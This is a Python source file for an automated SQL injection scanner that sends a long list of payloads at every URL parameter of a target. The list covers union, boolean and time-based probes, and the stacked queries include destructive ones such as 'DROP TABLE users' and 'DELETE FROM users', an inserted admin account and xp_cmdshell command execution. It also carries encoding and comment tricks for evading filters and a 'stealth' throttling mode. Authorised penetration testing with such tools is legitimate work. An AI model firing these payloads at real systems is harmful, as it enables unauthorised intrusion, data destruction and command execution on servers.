from core.scanner import BaseScanner
from typing import Dict, List, Optional
import asyncio

class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner - Ultra Massive Payloads"""
    
    def __init__(self, session, target: str, stealth: bool = False, massive: bool = False):
        super().__init__(session, target, stealth, massive)
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[str]:
        """Load massive SQL injection payloads"""
        base_payloads = [
            # Error-based
            "'", "\"", "`", "')", "\")", "`)", "'))", "\"))",
            "' OR '1'='1", "' OR '1'='1' --", "\" OR \"1\"=\"1",
            "' OR 1=1 --", "' OR 1=1#", "\" OR 1=1 --",
            "' OR '1'='1' /*", "' OR '1'='1' #",
            
            # Union-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT 1,2,3--", "\" UNION SELECT 1,2,3--",
            
            # Boolean-based
            "' AND '1'='1", "' AND '1'='2", "' AND 1=1--", "' AND 1=2--",
            "' OR 1=1--", "' OR 1=2--", "' AND SLEEP(5)--",
            
            # Time-based
            "' AND SLEEP(5)--", "\" AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--", "' OR pg_sleep(5)--", "' AND BENCHMARK(1000000,MD5('a'))--",
            
            # Stacked queries
            "'; DROP TABLE users; --", "'; DELETE FROM users; --",
            "'; INSERT INTO users VALUES('admin','pass'); --",
            
            # MySQL specific
            "' AND 1=1 UNION SELECT 1,@@version,3--", "' AND 1=1 UNION SELECT 1,database(),3--",
            "' AND 1=1 UNION SELECT 1,user(),3--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # MSSQL specific
            "'; EXEC xp_cmdshell('dir'); --", "'; EXEC master..xp_cmdshell 'dir'--",
            
            # PostgreSQL specific
            "'; SELECT pg_sleep(5); --", "' AND 1=1::int--",
            
            # Oracle specific
            "' AND 1=1 UNION SELECT NULL FROM DUAL--", "' AND 1=1 UNION SELECT 1 FROM DUAL--",
        ]
        
        massive_payloads = [
            # Advanced bypasses
            "'||'1'='1", "'%2b'1'='1", "'%252b'1'='1",
            "'%2527", "'%2527%2520OR%2520'1'='1",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Encoding variations
            "%27", "%22", "%60", "'%20or%20'1'='1",
            "admin'--", "admin'#", "admin'/*",
            
            # Comments bypass
            "' OR '1'='1'/**/--", "' OR '1'='1'/**/#",
            "'/**/OR/**/'1'='1", "'/**/OR/**/1=1--",
            
            # Case variations
            "' oR '1'='1", "' Or '1'='1", "' OR '1'='1",
            
            # Whitespace bypass
            "'%09OR%09'1'='1", "'%0aOR%0a'1'='1", "'%0dOR%0d'1'='1",
        ]
        
        if self.massive:
            return base_payloads + massive_payloads
        return base_payloads[:50] if self.stealth else base_payloads
        
    async def scan(self) -> List[Dict]:
        """Execute SQL injection scan"""
        if '?' in self.target:
            await self._test_url_parameters()
        return self.results
        
    async def _test_url_parameters(self):
        """Test URL parameters for SQL injection"""
        try:
            base_url, params = self.target.split('?', 1)
            param_pairs = [p.split('=', 1) for p in params.split('&')]
            
            # Get original response for comparison
            original_response = await self.http_client.get(self.target)
            original_text = original_response.text if original_response else ""
            
            for param_name, param_value in param_pairs:
                for idx, payload in enumerate(self.payloads):
                    if self.stealth and idx > 20:
                        break
                        
                    test_params = {param_name: payload}
                    test_url = self._build_url(base_url, test_params)
                    
                    result = await self.test_payload(payload, test_url, original_text)
                    if result:
                        self.add_result(
                            'SQL Injection',
                            'HIGH',
                            test_url,
                            f"Parameter '{param_name}' vulnerable with payload: {payload[:100]}"
                        )
                        break
                        
                    await asyncio.sleep(0.2 if self.stealth else 0.05)
        except Exception as e:
            pass
            
    async def test_payload(self, payload: str, url: str, original_text: str = "") -> Optional[Dict]:
        """Test SQL injection payload"""
        try:
            test_response = await self.http_client.get(url)
            
            if test_response:
                is_vulnerable = self.validator.validate_sqli(original_text, test_response.text)
                if is_vulnerable:
                    return {'vulnerable': True, 'payload': payload}
        except Exception as e:
            pass
        return None
        
    def _build_url(self, base_url: str, params: Dict) -> str:
        """Build URL with parameters"""
        param_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        return f"{base_url}?{param_string}"
